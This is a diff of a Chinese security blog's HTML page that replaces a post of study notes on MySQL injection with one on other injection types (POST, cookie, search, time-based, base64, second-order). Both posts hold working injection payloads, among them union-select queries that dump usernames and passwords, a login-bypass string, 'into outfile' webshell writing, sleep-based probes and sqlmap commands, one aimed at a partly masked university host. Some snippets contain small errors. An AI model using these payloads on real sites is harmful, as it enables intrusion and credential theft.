@@ -108,18 +108,18 @@
 
 
 
-  <meta name="description" content="mysql介绍及操作增删语句 information_schema是一个很重要的库，information_schema.tables">
+  <meta name="description" content="其他注入类型提交方式注入常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION； 之前的基本上都是GET注入，通过url进行传参；">
 <meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mysql注入">
-<meta property="og:url" content="https://bookchi.github.io/2019/03/24/mysql注入/index.html">
+<meta property="og:title" content="其他类型注入">
+<meta property="og:url" content="https://bookchi.github.io/2019/03/27/其他类型注入/index.html">
 <meta property="og:site_name" content="fuubar2">
-<meta property="og:description" content="mysql介绍及操作增删语句 information_schema是一个很重要的库，information_schema.tables">
+<meta property="og:description" content="其他注入类型提交方式注入常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION； 之前的基本上都是GET注入，通过url进行传参；">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-26T15:19:28.395Z">
+<meta property="og:updated_time" content="2019-03-27T15:02:41.942Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mysql注入">
-<meta name="twitter:description" content="mysql介绍及操作增删语句 information_schema是一个很重要的库，information_schema.tables">
+<meta name="twitter:title" content="其他类型注入">
+<meta name="twitter:description" content="其他注入类型提交方式注入常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION； 之前的基本上都是GET注入，通过url进行传参；">
 
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <link rel="canonical" href="https://bookchi.github.io/2019/03/24/mysql注入/"/>
+  <link rel="canonical" href="https://bookchi.github.io/2019/03/27/其他类型注入/"/>
 
 
 
@@ -138,7 +138,7 @@
   };
 </script>
 
-  <title>mysql注入 | fuubar2</title>
+  <title>其他类型注入 | fuubar2</title>
   
 
 
@@ -300,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/24/mysql注入/">
+    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/27/其他类型注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fuubar">
@@ -317,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">mysql注入
+          <h1 class="post-title" itemprop="name headline">其他类型注入
               
             
           </h1>
@@ -342,24 +342,12 @@
                 
               
 
-              <time title="Created: 2019-03-24 17:27:02" itemprop="dateCreated datePublished" datetime="2019-03-24T17:27:02+08:00">2019-03-24</time>
+              <time title="Created: 2019-03-27 23:01:09 / Modified: 23:02:41" itemprop="dateCreated datePublished" datetime="2019-03-27T23:01:09+08:00">2019-03-27</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-03-26 23:19:28" itemprop="dateModified" datetime="2019-03-26T23:19:28+08:00">2019-03-26</time>
               
             
           </span>
@@ -383,7 +371,7 @@
                   , 
                 
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/SQL注入/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/sql注入/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a></span>
 
                 
                 
@@ -417,99 +405,103 @@
       
 
       
-        <h4 id="mysql介绍及操作"><a href="#mysql介绍及操作" class="headerlink" title="mysql介绍及操作"></a>mysql介绍及操作</h4><p>增删语句</p>
-<p>information_schema是一个很重要的库，information_schema.tables</p>
+        <h3 id="其他注入类型"><a href="#其他注入类型" class="headerlink" title="其他注入类型"></a>其他注入类型</h3><h4 id="提交方式注入"><a href="#提交方式注入" class="headerlink" title="提交方式注入"></a>提交方式注入</h4><p>常见的提交方式：GET、POST、COOKIE、HEAD、PUT、OPTION；</p>
+<p>之前的基本上都是GET注入，通过url进行传参；</p>
 <a id="more"></a>
 <ul>
-<li><p>mysql的一些函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system_user() # 系统用户名</span><br><span class="line">user()	# 用户名	----</span><br><span class="line">current_user</span><br><span class="line">session_user()	# 连接数据库的用户名</span><br><span class="line">database()	# 数据库名	-----</span><br><span class="line">version()	# 数据库版本	-----</span><br><span class="line">load_file()	# 读取本地文件</span><br><span class="line">@@datadir	# 读取数据库路径</span><br><span class="line">@@basedir	# Mysql安装路径</span><br><span class="line">@@version_compile_os # OS</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>mysql数据库连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $host=&apos;localhost&apos;;	//数据库地址</span><br><span class="line">	$database=&apos;sui&apos;;	//数据库名称</span><br><span class="line">	$user=&apos;root&apos;;		//帐户</span><br><span class="line">	$passed=&apos;&apos;;			//密码</span><br><span class="line">	$webml=&apos;/0/&apos;;		//安装文件夹</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>如果是root权限的话，可以进一步提权；config、inc、data、common.inc</p>
-<p>==了解各种cms==</p>
-</li>
-</ul>
-<h4 id="mysql注入原理"><a href="#mysql注入原理" class="headerlink" title="mysql注入原理"></a>mysql注入原理</h4><ol>
-<li><p>注入形成原理</p>
-<p>get接收一个值，看他有没有过滤；</p>
-</li>
-<li><p>简单防注入实现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function check_sql($x)</span><br><span class="line">&#123;</span><br><span class="line">    $inject = array(&apos;and&apos;,&apos;union&apos;,&apos;select&apos;,&apos;from&apos;,&apos;or&apos;);</span><br><span class="line">    $i = str_replace($injection, &quot;&quot;, $x);</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">select * from admin where id=$id;</span><br><span class="line"></span><br><span class="line">function inject_check($str)</span><br><span class="line">&#123;</span><br><span class="line">    $temp = eregi(&apos;and|select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into&apos;,$str);</span><br><span class="line">    if($temp)&#123;</span><br><span class="line">        echo &quot;输入非法内容&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>绕过防注入</p>
-<p>比如改变大小写，嵌套关键字aandnd</p>
-</li>
-</ol>
-<h4 id="mysql注入其他操作"><a href="#mysql注入其他操作" class="headerlink" title="mysql注入其他操作"></a>mysql注入其他操作</h4><ol>
-<li><p>判断注入</p>
-</li>
-<li><p>判断列数</p>
-<p>oder by 10，返回正常就表示有10列</p>
-</li>
-<li><p>联合查询</p>
-<p><code>id=13 union select 1,2,3,4,5,6,7,8,9,10</code></p>
-<p>按理说，如果前面查询出来的不是数字，那他和后面的10个数字中的某一个类型就会不匹配，就应该报错；</p>
-<p>但是我的navicat并没有报错；重点就是利用这个报错显示信息； sqlserver没有这些； <em>第二列是字符类型</em></p>
+<li><p>post注入</p>
+<p>后台登录的时候，常用到post提交； </p>
+<p><strong>位置：</strong>设置密保手机/邮箱、修改信息等；</p>
+<p>post是通过表单传参；</p>
+<p>有时候前端处理了报错信息，通过bp抓包就可以看到报错信息了。</p>
+<h5 id="怎么测？"><a href="#怎么测？" class="headerlink" title="怎么测？"></a>怎么测？</h5><p>post发两个包，第一个包没有注入，可能第二个包就有注入了；</p>
 <ul>
-<li><p>查询版本</p>
-<p><code>id=13 union select 1,version(),3,4,5,6,7,8,9,10</code></p>
+<li><p>工具注</p>
+<p>可以使用sqlmap或者穿山甲进行注入；sqlmap可以和burpsuite联合使用；</p>
+<p>不同cms的post注入</p>
 </li>
-<li><p>查询用户</p>
-<p><code>id=13 union select 1,user(),3,4,5,6,7,8,9,10</code></p>
-</li>
-<li><p>查询数据库</p>
-<p><code>id=13 union select 1,database(),3,4,5,6,7,8,9,10</code></p>
-</li>
-<li><p>查询表</p>
-<p><code>id=13 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables where table_shema=xy # xy应转换为16进制</code></p>
-<p>直接’xy’不也行嘛？</p>
-</li>
-<li><p>查询列</p>
-<p><code>id=13 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10 from information_schema.columns where table_name=&#39;user&#39;</code></p>
-</li>
-<li><p>查询数据</p>
-<p><code>id=13 union select 1,group_concat(name,0x7e,pwd),3,4,5,6,7,8,9,10 from user</code></p>
-<p>0x7e是一个特殊字符 ~</p>
-</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li><p>mysql4.0渗透</p>
-<p>它没有information_schema表，所以不能爆出所有的表名列名；只能用字典爆破；</p>
-<p>利用sqlmap读文件；</p>
-</li>
-<li><p>mysql显错注入</p>
-<p><em>先百度，视频里就是直接复制粘贴就用了</em></p>
-</li>
-<li><p>后台绕过</p>
-<p>有时，#把后面的sql语句注释掉</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&apos;&apos; and password=&apos;&apos;</span><br><span class="line"># 输入admin&apos;#</span><br><span class="line"># 输入admin&apos; or &apos;1=1</span><br><span class="line"># 多试试几个闭合</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>mysql读写函数的使用</p>
-<p>load_file()函数，参数是绝对路径；用法和之前的暴库差不多；</p>
-<p>那绝对路径怎么找？ <code>c:/windows/system32/instsrv/metabase.xml</code></p>
+<li><p>并不是一定在参数的地方；%5B和%5D[]这两个括号之间；</p>
+<p>==把语句加在[]之间==，要url转码注入才可以；</p>
+<p>sqlmap的话，把包复制过去，在%5D前面加*，sqlmap就会在这里注入。</p>
 <blockquote>
-<p>报错显示；google hack搜索warning信息； 遗留文件phpinfo info test php； 漏洞爆路径；读取配置文件；</p>
-<p>上传报错比较容易：上传一个错误的东西，可能会把绝对路径爆出来；</p>
+<p>并不是说只在姓名那边有注入，一般管理员写的代码有一定的模式，类似的地方可能都是那么闭合的不要只是单纯的看参数的地方</p>
+<p>(织梦的0day很值钱？)看一下之前爆出来的漏洞在哪里，推测还有哪里可能存在；</p>
+</blockquote>
+<p>xdcms</p>
+</li>
+</ul>
+</li>
+<li><p>post注入利用工具</p>
+<p>穿山甲，sqlmap，手工</p>
+<p><code>sqlmap -u url --data &#39;username=admin&amp;passwd=admin&#39;</code></p>
+</li>
+<li><p>cookie注入</p>
+<p>有时get会有防注入，但是cookie可能没有被重视，那我攻击你的cookie;</p>
+<ul>
+<li>使用sqlmap来进行cookie注入：</li>
+</ul>
+<p><code>sqlmap -u http://127.0.0.1:8080 --cookie &quot;id=1&quot; --level 2</code> </p>
+<ul>
+<li><p>手工</p>
+<p>就是把注入语句放到cookie里提交，instead of url；</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 清空地址栏，输入</span><br><span class="line">javascript:alert(document.cookie="id="+escape("30and 1=1"))</span><br><span class="line"># 然后去掉 ?id=1553输入http://soft.XXX.edu.cn/list.asp返回正常</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie中转？？？？</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><em>cookie是个啥提交玩意？是在cookie里面注入吗？怎么注入？</em></p>
+<p>​    - 就是直接修改cookie的值，加入sql语句之类的</p>
+</blockquote>
+<h4 id="参数型注入"><a href="#参数型注入" class="headerlink" title="参数型注入"></a>参数型注入</h4><ul>
+<li><p>数字类型注入</p>
+</li>
+<li><p>字符类型注入</p>
+<p>以上两者就是get注入，只是参数的类型不一样；字符型的需要闭合引号；</p>
+</li>
+<li><p>搜索型注入</p>
+<p>搜索框这个位置存在注入；</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2%'and 1=1 and '%'='	# 返回和单独输入2是一样的页面</span><br><span class="line">2%'and 1=2 and '%'='	# 返回不同</span><br></pre></td></tr></table></figure>
+<p>因为要闭合比较麻烦，先用bp抓包，再用sqlmap来跑；</p>
+</li>
+</ul>
+<h4 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h4><ol>
+<li><p>伪静态注入</p>
+<p>看上去是一个html静态页面，实际上有动态的内容；</p>
+<p>爬站or目录扫描；</p>
+</li>
+<li><p>延迟注入</p>
+<p>什么是延迟注入？用页面延迟代替显错；</p>
+<blockquote>
+<p>如果满足某个条件，就延迟显示；</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and sleep(5);  //延迟5s返回，说明存在延迟注入； 那又怎样?是说明这个地方有注入吗？</span><br><span class="line"><span class="comment">/* mysql&lt;=5.0 benchmark(n,sql) */</span></span><br><span class="line"></span><br><span class="line">and if(true,sleep(5),0); ==IF(1=1,true,false);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果当前用户数是root，就延迟5s */</span></span><br><span class="line">and if(substring(user(),1,4)='root',sleep(5),1)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>base64注入</p>
+<blockquote>
+<p>什么时候需要base64编码注入？</p>
+<p>​    - 比如某个关键字被过滤，并且防御机制中有base64解码</p>
+</blockquote>
+<p>比如<code>MsdjksoLSKssmmWqef==</code></p>
+<p>使用sqlmap进行注入：<code>sqlmap -u http://xxxxx?id=1 --tamper</code></p>
+</li>
+<li><p>二阶注入</p>
+<p>一阶注入：提交语句，就返回结果；</p>
+<p>二阶注入：要两次攻击才能完成的；1）插入 2）执行，回显</p>
+<blockquote>
+<p>74cms人才系统存在二阶注入<code>aa&#39;, fullname=user()#</code></p>
+<p>​    首先把这句话插入数据库，然后数据库调用，回显</p>
 </blockquote>
 </li>
-<li><p>利用注入漏洞执行系统命令</p>
-<p>必须要root权限； <code>into outfile &#39;c.php&#39;</code></p>
-<p>可以导入一句话；可以创建用户；</p>
+<li><p>phpv9 authkey注入</p>
+<p>类似一个中转注入；用工具Havij速度会很快；</p>
 </li>
-<li><p>魔术引号与宽字节注入</p>
-<p>宽字节注入：是PHP的配置问题，<code>magic_quotes_runtime</code>；’会变成’</p>
-<p>sqlmap——unmagicquotes；<code>--tamper unmagicquotes.py</code></p>
+<li><p>http头注入</p>
 </li>
-</ul>
-<blockquote>
-<p>正则表达式还是需要熟悉，尤其是转义这一块</p>
-<p>url编码需要了解；</p>
-<p>转16进制可以绕过 ‘ 被过滤的情况</p>
-<p>mysql显错注入的了解；</p>
-</blockquote>
+<li><p>xml实体注入</p>
+</li>
+</ol>
 
       
     </div>
@@ -529,12 +521,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2019/03/24/mysql注入/">mysql注入</a></p>
+  <p><span>本文标题:</span><a href="/2019/03/27/其他类型注入/">其他类型注入</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 fuubar 的个人博客">fuubar</a></p>
-  <p><span>发布时间:</span>2019年03月24日 - 17:03</p>
-  <p><span>最后更新:</span>2019年03月26日 - 23:03</p>
-  <p><span>原始链接:</span><a href="/2019/03/24/mysql注入/" title="mysql注入">https://bookchi.github.io/2019/03/24/mysql注入/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/24/mysql注入/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年03月27日 - 23:03</p>
+  <p><span>最后更新:</span>2019年03月27日 - 23:03</p>
+  <p><span>原始链接:</span><a href="/2019/03/27/其他类型注入/" title="其他类型注入">https://bookchi.github.io/2019/03/27/其他类型注入/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/27/其他类型注入/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -578,8 +570,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/24/解析应用程序—爬取站点/" rel="next" title="解析应用程序——BurpSuite爬取站点">
-                <i class="fa fa-chevron-left"></i> 解析应用程序——BurpSuite爬取站点
+              <a href="/2019/03/26/Web缓存欺骗攻击/" rel="next" title="Web缓存欺骗攻击">
+                <i class="fa fa-chevron-left"></i> Web缓存欺骗攻击
               </a>
             
           </div>
@@ -587,10 +579,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/25/bufferoverflow原理/" rel="prev" title="bufferoverflow原理">
-                bufferoverflow原理 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -745,7 +733,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql介绍及操作"><span class="nav-number">1.</span> <span class="nav-text">mysql介绍及操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql注入原理"><span class="nav-number">2.</span> <span class="nav-text">mysql注入原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql注入其他操作"><span class="nav-number">3.</span> <span class="nav-text">mysql注入其他操作</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#其他注入类型"><span class="nav-number">1.</span> <span class="nav-text">其他注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提交方式注入"><span class="nav-number">1.1.</span> <span class="nav-text">提交方式注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#怎么测？"><span class="nav-number">1.1.1.</span> <span class="nav-text">怎么测？</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数型注入"><span class="nav-number">1.2.</span> <span class="nav-text">参数型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他注入"><span class="nav-number">1.3.</span> <span class="nav-text">其他注入</span></a></li></ol></li></ol></div>
             
 
           </div>
